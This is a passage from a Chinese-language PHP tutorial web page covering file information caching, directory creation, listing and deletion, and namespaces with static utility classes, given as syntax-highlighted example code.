class="string">&quot;Y-m-d H:i:s&quot;</span>, <span class="title function_ invoke__">filemtime</span>(<span class="variable">$filename</span>)),</span><br><span class="line">            <span class="string">&#x27;accessed&#x27;</span> =&gt; <span class="title function_ invoke__">date</span>(<span class="string">&quot;Y-m-d H:i:s&quot;</span>, <span class="title function_ invoke__">fileatime</span>(<span class="variable">$filename</span>))</span><br><span class="line">        ];</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 缓存结果</span></span><br><span class="line">        <span class="built_in">self</span>::<span class="variable">$cache</span>[<span class="variable">$filename</span>] = <span class="variable">$info</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$info</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 静态方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">formatSize</span>(<span class="params"><span class="variable">$bytes</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$units</span> = [<span class="string">&#x27;B&#x27;</span>, <span class="string">&#x27;KB&#x27;</span>, <span class="string">&#x27;MB&#x27;</span>, <span class="string">&#x27;GB&#x27;</span>, <span class="string">&#x27;TB&#x27;</span>];</span><br><span class="line">        <span class="variable">$i</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (<span class="variable">$bytes</span> &gt;= <span class="number">1024</span> &amp;&amp; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">count</span>(<span class="variable">$units</span>) - <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="variable">$bytes</span> /= <span class="number">1024</span>;</span><br><span class="line">            <span class="variable">$i</span>++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">round</span>(<span class="variable">$bytes</span>, <span class="number">2</span>) . <span class="string">&#x27; &#x27;</span> . <span class="variable">$units</span>[<span class="variable">$i</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用静态方法</span></span><br><span class="line"><span class="variable">$info</span> = <span class="title class_">FileInfo</span>::<span class="title function_ invoke__">getInfo</span>(<span class="string">&quot;example.txt&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$info</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;File: &quot;</span> . <span class="variable">$info</span>[<span class="string">&#x27;name&#x27;</span>] . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Size: &quot;</span> . <span class="title class_">FileInfo</span>::<span class="title function_ invoke__">formatSize</span>(<span class="variable">$info</span>[<span class="string">&#x27;size&#x27;</span>]) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Type: &quot;</span> . <span class="variable">$info</span>[<span class="string">&#x27;type&#x27;</span>] . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;MIME: &quot;</span> . <span class="variable">$info</span>[<span class="string">&#x27;mime&#x27;</span>] . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Last modified: &quot;</span> . <span class="variable">$info</span>[<span class="string">&#x27;modified&#x27;</span>] . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 从缓存获取</span></span><br><span class="line">    <span class="variable">$cachedInfo</span> = <span class="title class_">FileInfo</span>::<span class="title function_ invoke__">getInfo</span>(<span class="string">&quot;example.txt&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Retrieved from cache: &quot;</span> . (<span class="variable">$info</span> === <span class="variable">$cachedInfo</span> ? <span class="string">&quot;Yes&quot;</span> : <span class="string">&quot;No&quot;</span>) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="14-PHP目录操作"><a href="#14-PHP目录操作" class="headerlink" title="14. PHP目录操作"></a>14. PHP目录操作</h2><h3 id="详细解释-13"><a href="#详细解释-13" class="headerlink" title="详细解释"></a>详细解释</h3><p>PHP提供了一套完整的目录操作函数，用于创建、读取和删除目录。</p>
<h3 id="主要目录操作函数："><a href="#主要目录操作函数：" class="headerlink" title="主要目录操作函数："></a>主要目录操作函数：</h3><ul>
<li><code>opendir()</code>：打开目录句柄</li>
<li><code>readdir()</code>：从目录句柄中读取条目</li>
<li><code>closedir()</code>：关闭目录句柄</li>
<li><code>scandir()</code>：列出目录中的所有文件和目录</li>
<li><code>mkdir()</code>：创建目录</li>
<li><code>rmdir()</code>：删除目录</li>
<li><code>chdir()</code>：改变当前目录</li>
<li><code>getcwd()</code>：获取当前工作目录</li>
</ul>
<h3 id="示例-4"><a href="#示例-4" class="headerlink" title="示例"></a>示例</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 创建目录</span></span><br><span class="line"><span class="variable">$dir</span> = <span class="string">&quot;example_dir&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">file_exists</span>(<span class="variable">$dir</span>)) &#123;</span><br><span class="line">    <span class="title function_ invoke__">mkdir</span>(<span class="variable">$dir</span>, <span class="number">0777</span>, <span class="literal">true</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Directory &#x27;<span class="subst">$dir</span>&#x27; created.\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 列出目录内容</span></span><br><span class="line"><span class="variable">$files</span> = <span class="title function_ invoke__">scandir</span>(<span class="variable">$dir</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Directory contents of &#x27;<span class="subst">$dir</span>&#x27;:\n&quot;</span>;</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$files</span> <span class="keyword">as</span> <span class="variable">$file</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$file</span> != <span class="string">&quot;.&quot;</span> &amp;&amp; <span class="variable">$file</span> != <span class="string">&quot;..&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;- <span class="subst">$file</span>\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 递归读取目录</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">recursiveScan</span>(<span class="params"><span class="variable">$dir</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$result</span> = [];</span><br><span class="line">    <span class="variable">$cdir</span> = <span class="title function_ invoke__">scandir</span>(<span class="variable">$dir</span>);</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$cdir</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$value</span>, [<span class="string">&quot;.&quot;</span>, <span class="string">&quot;..&quot;</span>])) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">is_dir</span>(<span class="variable">$dir</span> . DIRECTORY_SEPARATOR . <span class="variable">$value</span>)) &#123;</span><br><span class="line">                <span class="variable">$result</span>[<span class="variable">$value</span>] = <span class="title function_ invoke__">recursiveScan</span>(<span class="variable">$dir</span> . DIRECTORY_SEPARATOR . <span class="variable">$value</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$result</span>[] = <span class="variable">$value</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$dirStructure</span> = <span class="title function_ invoke__">recursiveScan</span>(<span class="string">&quot;.&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Directory structure:\n&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$dirStructure</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 删除目录</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">deleteDir</span>(<span class="params"><span class="variable">$dir</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$files</span> = <span class="title function_ invoke__">array_diff</span>(<span class="title function_ invoke__">scandir</span>(<span class="variable">$dir</span>), [<span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;..&#x27;</span>]);</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$files</span> <span class="keyword">as</span> <span class="variable">$file</span>) &#123;</span><br><span class="line">        <span class="variable">$path</span> = <span class="variable">$dir</span> . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$file</span>;</span><br><span class="line">        <span class="title function_ invoke__">is_dir</span>(<span class="variable">$path</span>) ? <span class="title function_ invoke__">deleteDir</span>(<span class="variable">$path</span>) : <span class="title function_ invoke__">unlink</span>(<span class="variable">$path</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">rmdir</span>(<span class="variable">$dir</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建测试目录结构</span></span><br><span class="line"><span class="variable">$testDir</span> = <span class="string">&quot;test_dir&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">mkdir</span>(<span class="variable">$testDir</span>);</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;<span class="subst">$testDir</span>/file1.txt&quot;</span>, <span class="string">&quot;Content 1&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">mkdir</span>(<span class="string">&quot;<span class="subst">$testDir</span>/subdir&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;<span class="subst">$testDir</span>/subdir/file2.txt&quot;</span>, <span class="string">&quot;Content 2&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 删除测试目录</span></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$testDir</span>)) &#123;</span><br><span class="line">    <span class="title function_ invoke__">deleteDir</span>(<span class="variable">$testDir</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Test directory deleted.\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 目录操作工具类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DirectoryManager</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 静态缓存</span></span><br><span class="line">    <span class="keyword">private</span> <span class="built_in">static</span> <span class="variable">$cache</span> = [];</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 单例实例</span></span><br><span class="line">    <span class="keyword">private</span> <span class="built_in">static</span> <span class="variable">$instance</span> = <span class="literal">null</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;&#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">getInstance</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">self</span>::<span class="variable">$instance</span> === <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="built_in">self</span>::<span class="variable">$instance</span> = <span class="keyword">new</span> <span class="built_in">self</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">self</span>::<span class="variable">$instance</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 静态方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">listFiles</span>(<span class="params"><span class="variable">$dir</span>, <span class="variable">$recursive</span> = <span class="literal">false</span></span>) </span>&#123;</span><br><span class="line">        <span class="comment">// 检查缓存</span></span><br><span class="line">        <span class="variable">$cacheKey</span> = <span class="variable">$dir</span> . (<span class="variable">$recursive</span> ? <span class="string">&#x27;_recursive&#x27;</span> : <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="built_in">self</span>::<span class="variable">$cache</span>[<span class="variable">$cacheKey</span>])) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">self</span>::<span class="variable">$cache</span>[<span class="variable">$cacheKey</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">is_dir</span>(<span class="variable">$dir</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> [];</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="variable">$files</span> = [];</span><br><span class="line">        <span class="variable">$iterator</span> = <span class="variable">$recursive</span> ? <span class="keyword">new</span> <span class="built_in">RecursiveIteratorIterator</span>(<span class="keyword">new</span> <span class="built_in">RecursiveDirectoryIterator</span>(<span class="variable">$dir</span>)) : <span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="variable">$dir</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$iterator</span> <span class="keyword">as</span> <span class="variable">$file</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$file</span>-&gt;<span class="title function_ invoke__">isFile</span>()) &#123;</span><br><span class="line">                <span class="variable">$files</span>[] = <span class="variable">$file</span>-&gt;<span class="title function_ invoke__">getPathname</span>();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 缓存结果</span></span><br><span class="line">        <span class="built_in">self</span>::<span class="variable">$cache</span>[<span class="variable">$cacheKey</span>] = <span class="variable">$files</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$files</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 静态方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">createDirectory</span>(<span class="params"><span class="variable">$dir</span>, <span class="variable">$recursive</span> = <span class="literal">true</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">file_exists</span>(<span class="variable">$dir</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_ invoke__">mkdir</span>(<span class="variable">$dir</span>, <span class="number">0777</span>, <span class="variable">$recursive</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 静态方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">deleteDirectory</span>(<span class="params"><span class="variable">$dir</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">is_dir</span>(<span class="variable">$dir</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="variable">$files</span> = <span class="title function_ invoke__">array_diff</span>(<span class="title function_ invoke__">scandir</span>(<span class="variable">$dir</span>), [<span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;..&#x27;</span>]);</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$files</span> <span class="keyword">as</span> <span class="variable">$file</span>) &#123;</span><br><span class="line">            <span class="variable">$path</span> = <span class="variable">$dir</span> . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$file</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">is_dir</span>(<span class="variable">$path</span>)) &#123;</span><br><span class="line">                <span class="built_in">self</span>::<span class="title function_ invoke__">deleteDirectory</span>(<span class="variable">$path</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="title function_ invoke__">unlink</span>(<span class="variable">$path</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">rmdir</span>(<span class="variable">$dir</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">__clone</span>(<span class="params"></span>) </span>&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用静态方法</span></span><br><span class="line"><span class="variable">$dir</span> = <span class="string">&quot;temp_dir&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="title class_">DirectoryManager</span>::<span class="title function_ invoke__">createDirectory</span>(<span class="variable">$dir</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Directory created successfully\n&quot;</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 创建一些文件</span></span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;<span class="subst">$dir</span>/file1.txt&quot;</span>, <span class="string">&quot;Content 1&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;<span class="subst">$dir</span>/file2.txt&quot;</span>, <span class="string">&quot;Content 2&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 列出文件</span></span><br><span class="line">    <span class="variable">$files</span> = <span class="title class_">DirectoryManager</span>::<span class="title function_ invoke__">listFiles</span>(<span class="variable">$dir</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Files in directory:\n&quot;</span>;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$files</span> <span class="keyword">as</span> <span class="variable">$file</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;- &quot;</span> . <span class="title function_ invoke__">basename</span>(<span class="variable">$file</span>) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 递归列出（即使只有一个层级）</span></span><br><span class="line">    <span class="variable">$allFiles</span> = <span class="title class_">DirectoryManager</span>::<span class="title function_ invoke__">listFiles</span>(<span class="variable">$dir</span>, <span class="literal">true</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;All files (recursive):\n&quot;</span>;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$allFiles</span> <span class="keyword">as</span> <span class="variable">$file</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;- &quot;</span> . <span class="title function_ invoke__">basename</span>(<span class="variable">$file</span>) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 从缓存获取</span></span><br><span class="line">    <span class="variable">$cachedFiles</span> = <span class="title class_">DirectoryManager</span>::<span class="title function_ invoke__">listFiles</span>(<span class="variable">$dir</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Retrieved from cache: &quot;</span> . (<span class="variable">$files</span> === <span class="variable">$cachedFiles</span> ? <span class="string">&quot;Yes&quot;</span> : <span class="string">&quot;No&quot;</span>) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 删除目录</span></span><br><span class="line">    <span class="title class_">DirectoryManager</span>::<span class="title function_ invoke__">deleteDirectory</span>(<span class="variable">$dir</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Directory deleted\n&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="15-命名空间"><a href="#15-命名空间" class="headerlink" title="15. 命名空间"></a>15. 命名空间</h2><h3 id="详细解释-14"><a href="#详细解释-14" class="headerlink" title="详细解释"></a>详细解释</h3><p>命名空间是PHP 5.3+引入的特性，用于解决命名冲突问题。</p>
<h3 id="命名空间特点："><a href="#命名空间特点：" class="headerlink" title="命名空间特点："></a>命名空间特点：</h3><ul>
<li>避免类、函数和常量名称冲突</li>
<li>可以嵌套（子命名空间）</li>
<li>使用<code>namespace</code>关键字定义</li>
<li>使用<code>use</code>关键字引入命名空间</li>
</ul>
<h3 id="命名空间访问："><a href="#命名空间访问：" class="headerlink" title="命名空间访问："></a>命名空间访问：</h3><ul>
<li><strong>完全限定名称</strong>：<code>\Namespace\Class</code></li>
<li><strong>相对名称</strong>：<code>Class</code>（在当前命名空间内）</li>
<li><strong>限定名称</strong>：<code>SubNamespace\Class</code></li>
</ul>
<h3 id="静态方法在命名空间中的使用："><a href="#静态方法在命名空间中的使用：" class="headerlink" title="静态方法在命名空间中的使用："></a>静态方法在命名空间中的使用：</h3><ul>
<li>可以在命名空间中定义静态类</li>
<li>静态方法可以通过完全限定名称调用</li>
<li>在不同命名空间中可以有同名的静态类和方法</li>
</ul>
<h3 id="示例-5"><a href="#示例-5" class="headerlink" title="示例"></a>示例</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 定义命名空间</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">MyProject</span>\<span class="title class_">Utils</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 类定义</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">StringHelper</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 静态成员变量</span></span><br><span class="line">    <span class="keyword">private</span> <span class="built_in">static</span> <span class="variable">$instanceCount</span> = <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 构造函数</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="built_in">self</span>::<span class="variable">$instanceCount</span>++;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 静态方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">reverse</span>(<span class="params"><span class="variable">$string</span></span>) </span>&#123;</span><br><span class="line">        <span class="built_in">self</span>::<span class="variable">$instanceCount</span>++;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">strrev</span>(<span class="variable">$string</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 静态方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">getInstanceCount</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">self</span>::<span class="variable">$instanceCount</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 函数定义</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">formatTime</span>(<span class="params"><span class="variable">$timestamp</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">date</span>(<span class="string">&quot;Y-m-d H:i:s&quot;</span>, <span class="variable">$timestamp</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 常量定义</span></span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">MAX_LENGTH</span> = <span class="number">100</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 静态工具类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MathHelper</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 静态常量</span></span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">PI</span> = <span class="number">3.14159</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 静态方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">add</span>(<span class="params"><span class="variable">$a</span>, <span class="variable">$b</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$a</span> + <span class="variable">$b</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">multiply</span>(<span class="params"><span class="variable">$a</span>, <span class="variable">$b</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$a</span> * <span class="variable">$b</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 静态方法使用静态常量</span></span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">circleArea</span>(<span class="params"><span class="variable">$radius</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">self</span>::<span class="variable constant_">PI</span> * <span class="variable">$radius</span> * <span class="variable">$radius</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 子命名空间</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">MyProject</span>\<span class="title class_">Utils</span>\<span class="title class_">Math</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 静态工具类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Calculator</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 静态成员变量</span></span><br><span class="line">    <span class="keyword">private</span> <span class="built_in">static</span> <span class="variable">$operationCount</span> = <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 静态方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">add</span>(<span class="params"><span class="variable">$a</span>, <span class="variable">$b</span></span>) </span>&#123;</span><br><span class="line">        <span class="built_in">self</span>::<span class="variable">$operationCount</span>++;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$a</span> + <span class="variable">$b</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">subtract</span>(<span class="params"><span class="variable">$a</span>, <span class="variable">$b</span></span>) </span>&#123;</span><br><span class="line">        <span class="built_in">self</span>::<span class="variable">$operationCount</span>++;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$a</span> - <span class="variable">$b</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 静态方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">getOperationCount</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">self</span>::<span class="variable">$operationCount</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用命名空间</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Main</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 导入命名空间</span></span><br><span class="line"><span class="keyword">use</span> <span class="title">MyProject</span>\<span class="title">Utils</span>\<span class="title">StringHelper</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">MyProject</span>\<span class="title">Utils</span>\<span class="title">MathHelper</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">MyProject</span>\<span class="title">Utils</span>\<span class="title">Math</span>\<span class="title">Calculator</span> <span class="keyword">as</span> <span class="title">MathCalc</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用导入的类</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title class_">StringHelper</span>::<span class="title function_ invoke__">reverse</span>(<span class="string">&quot;Hello&quot;</span>) . <span class="string">&quot;\n&quot;</span>; <span class="comment">// olleH</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;StringHelper instances: &quot;</span> . <span class="title class_">StringHelper</span>::<span class="title function_ invoke__">getInstanceCount</span>() . <span class="string">&quot;\n&quot;</span>; <span class="comment">// 1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建实例会增加计数</span></span><br><span class="line"><span class="keyword">new</span> <span class="title class_">StringHelper</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;StringHelper instances: &quot;</span> . <span class="title class_">StringHelper</span>::<span class="title function_ invoke__">getInstanceCount</span>() . <span class="string">&quot;\n&quot;</span>; <span class="comment">// 2</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用静态方法</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;5 + 3 = &quot;</span> . <span class="title class_">MathHelper</span>::<span class="title function_ invoke__">add</span>(<span class="number">5</span>, <span class="number">3</span>) . <span class="string">&quot;\n&quot;</span>; <span class="comment">// 8</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Circle area (radius=5): &quot;</span> . <span class="title class_">MathHelper</span>::<span class="title function_ invoke__">circleArea</span>(<span class="number">5</span>) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用别名</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;10 - 3 = &quot;</span> . <span class="title class_">MathCalc</span>::<span class="title function_ invoke__">subtract</span>(<span class="number">10</span>, <span class="number">3</span>) . <span 